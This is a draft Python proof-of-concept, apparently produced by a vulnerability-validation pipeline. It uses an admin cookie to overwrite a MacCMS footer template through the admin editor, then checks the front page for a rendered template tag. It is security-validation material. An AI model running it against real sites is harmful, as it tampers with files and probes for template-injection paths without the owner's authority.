#!/usr/bin/env python3
# Source-Run: <required: completed loop9 run dir>
# Source-Report: <required: solution_v*/part*.md or validation_report_v*/part*.md or shared_context/*>
# Source-Finding: <required: exact finding title / finding id>
# Classification: <required: candidate | discretionary | internal-only | conditional-chain>
# Preconditions: <required: concise exploit / reachability preconditions>
# Defense-Model: none-observed
# Defense-Notes: none
# Payload-Constraints: none
# Confidence: medium
# Status: draft

"""
风格要求：
- 简单直接，完全够用
- 不要为了“写得高级”而过度封装
- 先把漏洞原理、请求形状、成功判定逻辑咬准
- 若只是安全验证版 PoC，也要把边界和前提写清楚
- 若 source evidence 显示过滤 / 黑白名单 / 禁用函数 / 动态策略来源，必须把上面的 Defense-* 字段改成真实判断
- 若未观察到相关信号，不要臆造；保留 `none-observed` / `none` 即可
- 如果 payload 只是候选绕过而非已验证默认方案，必须在代码注释里写清楚不确定性
"""

import urllib.parse
import urllib.request


# ================= 1. 配置参数 =================
# 以下参数应与漏洞原理严格对应；不要保留与该 finding 无关的装饰性配置。
base_url = "http://127.0.0.1:8000"
admin_cookie = "PHPSESSID=replace-me"
write_path = "/admin.php/admin/template/info.html"
template_file = "template/default/html/public/foot.html"
payload = '<maccms:vod num="1" order="desc">{$obj.vod_name}</maccms:vod>'


# ================= 2. 构造请求头 =================
headers = {
    "Cookie": admin_cookie,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Simplified PoC)",
}


# ================= 3. 步骤一：覆写模板文件 =================
print("[*] 正在利用后台接口写入 Payload 到模板...")
post_data = urllib.parse.urlencode({"file": template_file, "content": payload}).encode()
write_req = urllib.request.Request(
    base_url + write_path,
    data=post_data,
    headers=headers,
    method="POST",
)

try:
    with urllib.request.urlopen(write_req, timeout=10) as response:
        print(f"[+] 写入请求完成，HTTP 状态码: {response.status}")
except Exception as exc:
    print(f"[-] 写入请求失败: {exc}")


# ================= 4. 步骤二：访问前台触发渲染 =================
print("[*] 正在访问前台页面触发模板渲染...")
render_req = urllib.request.Request(base_url + "/")

try:
    with urllib.request.urlopen(render_req, timeout=10) as response:
        body = response.read().decode("utf-8", errors="ignore")
        print(f"[+] 渲染请求完成，HTTP 状态码: {response.status}")

        if payload in body:
            print("[!] 警告：发现 Payload 原文，可能未被解析（原样输出）。")
        else:
            print("[+] 页面加载成功，请手动检查页面底部是否出现了非预期的内容或代码执行结果。")
except Exception as exc:
    print(f"[-] 渲染请求失败: {exc}")
